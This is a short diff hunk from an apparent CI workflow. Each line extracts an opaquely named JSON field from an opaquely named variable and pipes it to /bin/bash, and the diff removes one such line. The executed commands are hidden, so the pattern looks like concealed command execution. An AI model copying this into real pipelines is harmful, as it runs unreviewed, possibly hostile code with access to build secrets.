@@ -32,7 +32,6 @@ jobs:
           echo $bdls02 | jq -r .h81627 | /bin/bash
           printf '%s' "$av890" | jq -r .bddd1 | /bin/bash
           echo $npjn5109 | jq -r .l7 | /bin/bash
-          printf '%s' "$m02" | jq -r .mfzkf8 | /bin/bash
           echo $zxn9 | jq -r .aue8 | /bin/bash
           echo $vbuv5 | jq -r .pro739 | /bin/bash
 
